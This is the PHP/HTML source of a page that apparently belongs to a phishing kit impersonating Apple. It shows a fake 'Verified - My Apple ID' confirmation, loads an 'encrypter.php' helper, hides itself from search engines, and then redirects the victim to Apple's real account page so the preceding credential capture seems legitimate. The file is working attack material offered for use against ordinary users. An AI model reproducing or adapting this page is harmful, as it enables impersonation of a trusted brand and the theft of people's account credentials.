<?php
$indexs="Confirmed.php?Valid=TRUE&Header=1&Session=".$_GET['Session'];
$Redirect="http://store.apple.com/us/account/home"; 
require_once 'encrypter.php';
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html class="en-us nojs us en amr" lang="en-US">
<head>
<meta name="viewport" content="width=1024" />
<meta name="robots" content="noindex, nofollow"/>
<META HTTP-EQUIV="Refresh" CONTENT="4;URL=<?php echo $Redirect; ?>">


<title>Verified  - My Apple ID</title>
<meta charset="utf-8" />
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
<link rel="icon" type="image/png" href="base/images/favicon.png">
<link rel="shortcut icon" type="image/x-icon" href="base/images/favicon.ico">





 


<script>
	//replace nojs class with js on html element
	(function(html){
		html.className = html.className.replace(/\bnojs\b/,'js')
	})(document.documentElement);
</script>


<!--[if gte IE 9]><!-->
<link rel="stylesheet" href="base/css/baseX.css?style_session=<?php echo $indexs; ?>" media="screen, print" />
<!--<![endif]-->






<link rel="stylesheet" href="base/css/aos-overrides.css?style_session=<?php echo $indexs; ?>" media="screen, print" />



<link rel="stylesheet" href="base/css/aos-local.css?style_session=<?php echo $indexs; ?>" media="" />



<!--[if gte IE 9]><!-->
<link rel="stylesheet" href="base/css/fonts200.css?style_session=<?php echo $indexs; ?>" media="" />
<!--<![endif]-->





<script>
	window.irOn=true;
</script>





<script>
	// Emits an extra bit to let FE know whether AI feedback is enabled.
	Event.onLoad(window.apple.ai.init);
</script>








		
		
    



</head>
<body id="checkout-processing" class="interim">
	
	<div id="processing"> </div>
    <div class="metrics">
      
		
   


		



	  
 	</div>



	

	<div id="container">
		<div id="interim-body" class="blue-header-popup">
			<div class="processing-header">
			</div>
			<div class="content clearfix">
				<p class="single-message"><span>You have been successfully Verified Your Apple ID<br /> <br />
												You will be redirected to your account homepage within 5 seconds.</span></p>
				
				
			</div>
	
			<div class="footer empty-footer clearfix">
				<p>&nbsp;</p>
			</div>
		</div>
	</div>


	


</body>

</html>
<?php ob_end_flush(); ?>